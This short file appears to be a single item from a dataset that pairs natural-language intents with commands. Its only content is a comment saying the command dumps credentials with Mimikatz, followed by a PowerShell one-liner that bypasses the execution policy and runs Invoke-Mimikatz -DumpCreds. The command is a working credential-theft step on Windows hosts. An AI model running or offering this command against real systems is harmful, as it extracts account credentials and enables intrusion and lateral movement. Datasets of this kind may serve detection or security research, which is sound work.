# Natural language intent:
# Executes Mimikatz to dump credentials with specific execution policies.

powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Mimikatz -DumpCreds"
